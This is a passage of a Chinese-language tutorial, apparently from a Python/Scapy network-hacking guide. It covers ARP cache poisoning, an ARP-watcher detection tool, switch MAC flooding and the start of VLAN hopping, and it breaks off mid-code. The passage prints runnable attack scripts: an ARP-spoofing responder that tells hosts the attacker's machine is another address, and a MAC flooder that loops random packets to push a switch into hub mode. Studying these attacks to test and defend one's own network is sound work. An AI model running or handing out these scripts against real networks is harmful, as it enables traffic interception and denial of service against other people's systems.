<p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sys.exit(</code><code>0</code><code>)&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>def</code> <code>arp_poison_callback(packet):</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code># Got ARP request?</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code> <code>packet[ARP].op </code><code>=</code><code>=</code> <code>1</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>answer </code><code>=</code> <code>Ether(dst</code><code>=</code><code>packet[ARP].hwsrc) </code><code>/</code> <code>ARP()</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>answer[ARP].op </code><code>=</code> <code>&quot;is-at&quot;</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>answer[ARP].hwdst </code><code>=</code> <code>packet[ARP].hwsrc</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>answer[ARP].psrc </code><code>=</code> <code>packet[ARP].pdst</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>answer[ARP].pdst </code><code>=</code> <code>packet[ARP].psrc&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>&quot;Fooling &quot;</code> <code>+</code> <code>packet[ARP].psrc </code><code>+</code> <code>&quot; that &quot;</code> <code>+</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>packet[ARP].pdst </code><code>+</code> <code>&quot; is me&quot;</code>&nbsp;&nbsp;&nbsp;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sendp(answer, iface</code><code>=</code><code>sys.argv[</code><code>1</code><code>])&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>sniff(prn</code><code>=</code><code>arp_poison_callback,</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>filter</code><code>=</code><code>&quot;arp&quot;</code><code>,</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>iface</code><code>=</code><code>sys.argv[</code><code>1</code><code>],</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>store</code><code>=</code><code>0</code><code>)</code></p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>从参数<code>iface</code>指定的网卡中，<code>sniff()</code>函数无限循环地读取数据包。将<code>PACP</code>过滤器设置为<code>arp</code>，使接收到的数据包都被自动过滤，来保证我们的回调函数<code>arp_poison_callback</code>在被调用时，只有<code>ARP</code>数据包作为输入。同时由于参数<code>store=0</code>，数据包将不会被存储。</p>\r\n\r\n<p><code>arp_poison_callback()</code>函数处理我们的实际工作。首先，它会检查<code>ARP</code>报文的<code>OP code</code>：当它是1时则为一个<code>ARP</code>请求，然后我们来生成一个响应包，在响应数据包中，我们将请求包中的源<code>MAC</code>地址和<code>IP</code>地址作为目的<code>MAC</code>地址和<code>IP</code>地址。因为我们未定义源<code>MAC</code>地址，所以<code>Scapy</code>会自动插入发送数据包的网络接口地址。</p>\r\n\r\n<p><code>ARP</code>中<code>IP</code>与<code>MAC</code>地址的对应关系会被缓存一段时间，因为它会被转储起来，对同一地址一遍又一遍地进行解析。可以用如下命令显示<code>ARP</code>缓存：</p>\r\n\r\n<pre>\r\narp -an\r\n? (192.168.13.5) at c0:de:de:ad:be:ef [ether] on eth0\r\n</pre>\r\n\r\n<p>这依赖于操作系统和它的版本，本地配置设置及地址被缓存的时间。</p>\r\n\r\n<p>为了抵御<code>ARP</code>欺骗攻击，一方面可以使用<code>ARP</code>静态表，但是这同样可以被接收到的<code>ARP</code>响应所覆盖，这些均依赖于操作系统对<code>ARP</code>的处理代码。另一方面也可以使用像<code>ARP watcher</code>这样的工具。<code>ARP watcher</code>监控<code>ARP</code>流量，并报告可疑行为但并不阻止。现在最先进的入侵检测系统可以检测到ARP缓存中毒攻击。你应该使用上面的代码，检查一下你的<code>IDS</code>，看看它是如何表现的。</p>\r\n\r\n<h1>0x03 ARP-Watcher</h1>\r\n\r\n<hr />\r\n<p>接下来我们编写一个小工具，来报告所有新连接到我们网络的设备，为此它必须能够记住所有<code>IP</code>和<code>MAC</code>地址的对应关系。此外，它还可以检测出一个网络设备是否突然更改了它的<code>MAC</code>地址。</p>\r\n\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n\r\n			<p>12</p>\r\n\r\n			<p>13</p>\r\n\r\n			<p>14</p>\r\n\r\n			<p>15</p>\r\n\r\n			<p>16</p>\r\n\r\n			<p>17</p>\r\n\r\n			<p>18</p>\r\n\r\n			<p>19</p>\r\n\r\n			<p>20</p>\r\n\r\n			<p>21</p>\r\n\r\n			<p>22</p>\r\n\r\n			<p>23</p>\r\n\r\n			<p>24</p>\r\n\r\n			<p>25</p>\r\n\r\n			<p>26</p>\r\n\r\n			<p>27</p>\r\n\r\n			<p>28</p>\r\n\r\n			<p>29</p>\r\n\r\n			<p>30</p>\r\n\r\n			<p>31</p>\r\n\r\n			<p>32</p>\r\n\r\n			<p>33</p>\r\n\r\n			<p>34</p>\r\n\r\n			<p>35</p>\r\n\r\n			<p>36</p>\r\n\r\n			<p>37</p>\r\n\r\n			<p>38</p>\r\n\r\n			<p>39</p>\r\n\r\n			<p>40</p>\r\n\r\n			<p>41</p>\r\n\r\n			<p>42</p>\r\n\r\n			<p>43</p>\r\n\r\n			<p>44</p>\r\n\r\n			<p>45</p>\r\n\r\n			<p>46</p>\r\n\r\n			<p>47</p>\r\n\r\n			<p>48</p>\r\n\r\n			<p>49</p>\r\n\r\n			<p>50</p>\r\n\r\n			<p>51</p>\r\n\r\n			<p>52</p>\r\n\r\n			<p>53</p>\r\n\r\n			<p>54</p>\r\n\r\n			<p>55</p>\r\n\r\n			<p>56</p>\r\n\r\n			<p>57</p>\r\n\r\n			<p>58</p>\r\n\r\n			<p>59</p>\r\n\r\n			<p>60</p>\r\n\r\n			<p>61</p>\r\n\r\n			<p>62</p>\r\n\r\n			<p>63</p>\r\n\r\n			<p>64</p>\r\n\r\n			<p>65</p>\r\n\r\n			<p>66</p>\r\n\r\n			<p>67</p>\r\n			</td>\r\n			<td>\r\n			<p><code>#!/usr/bin/python&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>from</code> <code>scapy.</code><code>all</code> <code>import</code> <code>sniff, ARP</code></p>\r\n\r\n			<p><code>from</code> <code>signal </code><code>import</code> <code>signal, SIGINT</code></p>\r\n\r\n			<p><code>import</code> <code>sys&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>arp_watcher_db_file </code><code>=</code> <code>&quot;/var/cache/arp-watcher.db&quot;</code></p>\r\n\r\n			<p><code>ip_mac </code><code>=</code> <code>{}&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code># Save ARP table on shutdown</code></p>\r\n\r\n			<p><code>def</code> <code>sig_int_handler(signum, frame):</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>&quot;Got SIGINT. Saving ARP database...&quot;</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>try</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>f </code><code>=</code> <code>open</code><code>(arp_watcher_db_file, </code><code>&quot;w&quot;</code><code>)&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>for</code> <code>(ip, mac) </code><code>in</code> <code>ip_mac.items():</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>f.write(ip </code><code>+</code> <code>&quot; &quot;</code> <code>+</code> <code>mac </code><code>+</code> <code>&quot;\\n&quot;</code><code>)&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>f.close()</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>&quot;Done.&quot;</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>except</code> <code>IOError:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>&quot;Cannot write file &quot;</code> <code>+</code> <code>arp_watcher_db_file</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sys.exit(</code><code>1</code><code>)&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>def</code> <code>watch_arp(pkt):</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code># got is-at pkt (ARP response)</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code> <code>pkt[ARP].op </code><code>=</code><code>=</code> <code>2</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>pkt[ARP].hwsrc </code><code>+</code> <code>&quot; &quot;</code> <code>+</code> <code>pkt[ARP].psrc&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code># Device is new. Remember it.</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code> <code>ip_mac.get(pkt[ARP].psrc) </code><code>=</code><code>=</code> <code>None</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>&quot;Found new device &quot;</code> <code>+</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>pkt[ARP].hwsrc </code><code>+</code> <code>&quot; &quot;</code> <code>+</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>pkt[ARP].psrc</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ip_mac[pkt[ARP].psrc] </code><code>=</code> <code>pkt[ARP].hwsrc&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code># Device is known but has a different IP</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>elif</code> <code>ip_mac.get(pkt[ARP].psrc) </code><code>and</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ip_mac[pkt[ARP].psrc] !</code><code>=</code> <code>pkt[ARP].hwsrc:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>pkt[ARP].hwsrc </code><code>+</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>&quot; has got new ip &quot;</code> <code>+</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>pkt[ARP].psrc </code><code>+</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>&quot; (old &quot;</code> <code>+</code> <code>ip_mac[pkt[ARP].psrc] </code><code>+</code> <code>&quot;)&quot;</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ip_mac[pkt[ARP].psrc] </code><code>=</code> <code>pkt[ARP].hwsrc&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>signal(SIGINT, sig_int_handler)&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>if</code> <code>len</code><code>(sys.argv) &lt; </code><code>2</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>sys.argv[</code><code>0</code><code>] </code><code>+</code> <code>&quot; &lt;iface&gt;&quot;</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sys.exit(</code><code>0</code><code>)&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>try</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>fh </code><code>=</code> <code>open</code><code>(arp_watcher_db_file, </code><code>&quot;r&quot;</code><code>)</code></p>\r\n\r\n			<p><code>except</code> <code>IOError:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>&quot;Cannot read file &quot;</code> <code>+</code> <code>arp_watcher_db_file</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sys.exit(</code><code>1</code><code>)&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>for</code> <code>line </code><code>in</code> <code>fh:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>line.chomp()</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>(ip, mac) </code><code>=</code> <code>line.split(</code><code>&quot; &quot;</code><code>)</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ip_mac[ip] </code><code>=</code> <code>mac&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>sniff(prn</code><code>=</code><code>watch_arp,</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>filter</code><code>=</code><code>&quot;arp&quot;</code><code>,</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>iface</code><code>=</code><code>sys.argv[</code><code>1</code><code>],</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>store</code><code>=</code><code>0</code><code>)</code></p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>开始我们定义了一个信号处理函数<code>sig_int_handler()</code>，当用户中断程序时该函数会被调用。该函数会在<code>ip_mac</code>字典中，将所有已知的<code>IP</code>和<code>MAC</code>地址对应关系保存到一个文件当中。一开始我们读取这些<code>ARP db</code>文件，用目前已知的所有对应关系来初始化程序，若文件无法读取则退出。然后我们将文件内容一行一行地循环读取，把每一行分割为<code>IP</code>和<code>MAC</code>地址，将它们保存到 <code>ip_mac</code>字典中。我们再调用已知的<code>sniff()</code>函数，对每一个接收到的<code>ARP</code>数据包，调用回调函数<code>watch_arp</code>。</p>\r\n\r\n<p><code>watch_arp</code>函数是整个程序中的核心逻辑部分。当嗅探到的数据包是<code>is-at</code>数据包时，则该数据包为一个<code>ARP</code>响应。紧接着我们首先检查IP是否存在于<code>ip_mac</code>字典中。如果我们没有发现对应条目，则其为一个新设备，并在屏幕上显示一条信息。否则我们将数据包中的<code>MAC</code>地址与字典中的<code>MAC</code>相比较，如果不同则响应很可是伪造的，我们也在屏幕上显示一条消息。在这两种情况下，都会用新的信息来更新字典。</p>\r\n\r\n<h1>0x04 MAC-Flooder</h1>\r\n\r\n<hr />\r\n<p>交换机和其他计算机一样，具有有限的内存，交换机中存放<code>MAC</code>地址信息的表格也同样如此，该表格记录哪个<code>MAC</code>地址对应哪个端口及其内部的<code>ARP</code>缓 存。当交换机的缓冲区溢出时，它们的反应就会有些古怪。这将会导致交换机拒绝服务，以至于放弃交换行为而变得像正常的集线器。在集线器模式下，整体的高流 量不会是你遇到的唯一问题，因此在没有附加操作下，所有已连接的计算机都会接收到完整的流量。你应该测试一下的你的交换机在这种意外情况下是如何反应的， 接下来的脚本就可以做到这一点。它会产生随机的<code>MAC</code>地址，并将它们发送到你的交换机中，直到交换机的缓冲区被填满。</p>\r\n\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n\r\n			<p>12</p>\r\n\r\n			<p>13</p>\r\n\r\n			<p>14</p>\r\n\r\n			<p>15</p>\r\n\r\n			<p>16</p>\r\n\r\n			<p>17</p>\r\n\r\n			<p>18</p>\r\n\r\n			<p>19</p>\r\n			</td>\r\n			<td>\r\n			<p><code>#!/usr/bin/python&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>import</code> <code>sys</code></p>\r\n\r\n			<p><code>from</code> <code>scapy.</code><code>all</code> <code>import</code> <code>*</code>&nbsp;&nbsp;&nbsp;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>packet </code><code>=</code> <code>Ether(src</code><code>=</code><code>RandMAC(</code><code>&quot;*:*:*:*:*:*&quot;</code><code>),</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>dst</code><code>=</code><code>RandMAC(</code><code>&quot;*:*:*:*:*:*&quot;</code><code>)) </code><code>/</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>IP(src</code><code>=</code><code>RandIP(</code><code>&quot;*.*.*.*&quot;</code><code>),</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>dst</code><code>=</code><code>RandIP(</code><code>&quot;*.*.*.*&quot;</code><code>)) </code><code>/</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ICMP()&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>if</code> <code>len</code><code>(sys.argv) &lt; </code><code>2</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>dev </code><code>=</code> <code>&quot;eth0&quot;</code></p>\r\n\r\n			<p><code>else</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>dev </code><code>=</code> <code>sys.argv[</code><code>1</code><code>]&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>print</code> <code>&quot;Flooding net with random packets on dev &quot;</code> <code>+</code> <code>dev&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>sendp(packet, iface</code><code>=</code><code>dev, loop</code><code>=</code><code>1</code><code>)</code></p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><code>RandMAC</code>和<code>RandIP</code>负责随机地产生地址当中的每一个字节。其余的则由<code>sendp()</code>函数的循环参数完成。</p>\r\n\r\n<h1>0x05 VLAN Hopping</h1>\r\n\r\n<hr />\r\n<p>因为<code>VLAN</code>不具备安全特性，一方面标记<code>VLAN</code>取决于包含<code>VLAN id</code>的数据包头部，使用<code>Scapy</code>可以很容易创建这样的数据包。现在让我们的电脑连接到<code>VLAN1</code>，并且尝试去<code>ping VLAN2</code>上的其他主机。</p>\r\n\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n			</td>\r\n			<td>\r\n			<p><code>#!/usr/bin/python&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>from</code> <code>scapy.</code><code>all</code> <code>import</code> <code>*</code>&nbsp;&nbsp;&nbsp;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>packet </code><code>=</code> 